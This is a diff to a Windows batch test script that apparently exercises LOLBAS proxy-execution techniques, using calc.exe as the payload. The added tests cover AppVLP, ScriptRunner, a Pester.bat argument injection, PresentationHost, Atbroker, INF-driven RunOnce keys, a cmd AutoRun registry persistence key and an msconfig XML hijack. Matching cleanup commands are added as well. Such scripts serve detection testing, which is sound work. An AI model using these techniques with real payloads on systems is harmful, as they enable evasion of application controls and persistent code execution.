@@ -468,6 +468,111 @@ echo Command Excuted: cscript C:\windows\system32\manage-bde.wsf
 REM Reset ComSpec
 set comspec=C:\WINDOWS\system32\cmd.exe
 
+timeout 5
+
+echo %time% %date% [+] Testing AppVLP.exe exec
+start "" cmd /c "C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe" calc.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: "C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe" calc.exe
+
+timeout 5
+
+echo %time% %date% [+] Testing ScriptRunner.exe exec
+start "" cmd /c C:\Windows\System32\ScriptRunner.exe -appvscript cmd.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: C:\Windows\System32\ScriptRunner.exe -appvscript calc.exe
+
+timeout 5
+
+echo %time% %date% [+] Testing Pester.bat (PS3.0) exec
+start "" cmd /c C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat help  "; Start-Process calc.exe"
+echo Execution Finished at %time% %date%
+echo Command Excuted: C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat help  "; Start-Process calc.exe"
+
+timeout 5
+
+echo %time% %date% [+] Testing powershellcustomhost.exe exec
+echo Start-Process calc.exe > calc.ps1
+start "" cmd /c "C:\Program Files\IIS\Microsoft Web Deploy V3\Scripts\powershellcustomhost.exe" calc.ps1
+echo Execution Finished at %time% %date%
+echo Command Excuted: "C:\Program Files\IIS\Microsoft Web Deploy V3\Scripts\powershellcustomhost.exe" calc.ps1
+
+timeout 5
+
+echo %time% %date% [+] Testing PresentationHosts.exe exec
+start "" cmd /c PresentationHost.exe file://c:\windows\system32\calc.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: PresentationHost.exe file://c:\windows\system32\calc.exe
+timeout 5
+
+
+echo %time% %date% [+] Testing PresentationHosts.exe exec
+start "" cmd /c reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "start calc.exe"
+start "" cmd /c cmd.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun /d "start calc.exe"
+echo Command Excuted: cmd.exe
+timeout 5
+
+echo %time% %date% [+] Testing gpup.exe exec
+start "" cmd /c "C:\Program Files (x86)\Notepad++\updater\gpup.exe -w whatever -e c:\Windows\System32\calc.exe"
+echo Execution Finished at %time% %date%
+echo Command Excuted: C:\Program Files (x86)\Notepad++\updater\gpup.exe -w whatever -e c:\Windows\System32\calc.exe
+
+timeout 5
+
+echo ^; DRIVER.INF > calc2.inf
+echo ^; Copyright (c) Microsoft Corporation.  All rights reserved. >> calc2.inf
+echo [Version] >> calc2.inf
+echo Signature = "$CHICAGO$" >> calc2.inf
+echo Class=61883 >> calc2.inf
+echo ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17} >> calc2.inf
+echo Provider=%Msft% >> calc2.inf
+echo DriverVer=06/21/2006,6.1.7600.16385 >> calc2.inf
+echo [DestinationDirs] >> calc2.inf
+echo DefaultDestDir = 1 >> calc2.inf
+echo [DefaultInstall] >> calc2.inf
+echo AddReg = CalcStart >> calc2.inf
+echo [CalcStart] >> calc2.inf
+echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc2.inf
+
+echo %time% %date% [+] Testing VBoxDrvInst.exe exec
+start "" cmd /c "C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxDrvInst.exe" driver executeinf calc2.inf 
+echo Execution Finished at %time% %date%
+echo Command Excuted: "C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxDrvInst.exe" driver executeinf calc2.inf 
+
+timeout 5
+
+echo %time% %date% [+] Testing InstallHinfSection exec
+start "" cmd /c "C:\Program Files (x86)\Citrix\ICA Client\Drivers64\Usbinst.exe" InstallHinfSection "DefaultInstall 128 calc2.inf"
+echo Execution Finished at %time% %date%
+echo Command Excuted: "C:\Program Files (x86)\Citrix\ICA Client\Drivers64\Usbinst.exe" InstallHinfSection "DefaultInstall 128 calc2.inf"
+
+timeout 5
+
+echo %time% %date% [+] Testing Atbroker exec
+start "" cmd /c "C:\Windows\System32\Atbroker.exe C:\windows\system32\calc.exe"
+start "" cmd /c "C:\Windows\SysWOW64\Atbroker.exe C:\windows\system32\calc.exe"
+echo Execution Finished at %time% %date%
+echo Command Excuted: "C:\Windows\System32\Atbroker.exe C:\windows\system32\calc.exe"
+echo Command Excuted: "C:\Windows\SysWOW64\Atbroker.exe C:\windows\system32\calc.exe"
+
+
+timeout 5
+
+echo %time% %date% [+] Testing MSCONFIG exec
+echo ^<?xml version="1.0" ?^> > %windir%\System32\mscfgtlc.xml
+echo ^<MSCONFIGTOOLS^> >> %windir%\System32\mscfgtlc.xml
+echo ^<a NAME="LOLBin" PATH="%windir%\System32\cmd.exe" DEFAULT_OPT="" ADV_OPT="/c calc.exe" HELP="LOLBin MSCONFIGTOOLS"^/^> >> %windir%\System32\mscfgtlc.xml
+echo ^</MSCONFIGTOOLS^> >> %windir%\System32\mscfgtlc.xml
+start "" cmd /c msconfig.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: msconfig.exe
+start "" cmd /c del %windir%\System32\mscfgtlc.xml
+
+timeout 5
+
+
 REM ---- EOF LOLBAS Payloads ----
 
 echo **********************************************
@@ -593,6 +698,7 @@ echo [+] Cleanup
 start "" cmd /c del xxxFile.csproj
 start "" cmd /c del AllTheThings.dll
 start "" cmd /c del fi.b64
+start "" cmd /c del calc.ps1
 start "" cmd /c del diskshadow.txt 
 start "" cmd /c del adrestore.exe
 start "" cmd /c del Default_File_Path.ps1
@@ -604,6 +710,7 @@ start "" cmd /c del trace.cab
 start "" cmd /c del calc.inf
 start "" cmd /c del 12.txt
 start "" cmd /c del payload.cs
+start "" cmd /c del calc2.inf 
 start "" cmd /c del payload.exe
 start "" cmd /c del testADS.txt
 start "" cmd /c del C:\windows\temp\url.url
@@ -613,6 +720,7 @@ start "" cmd /c reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Si
 start "" cmd /c reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /f
 start "" cmd /c sc delete evilservice
 start "" cmd /c schtasks /delete /tn mysc /f
+start "" cmd /c reg delete "HKCU\Software\Microsoft\Command Processor" /v AutoRun /f 
 
 echo "[+] Killing leftover binaries
 
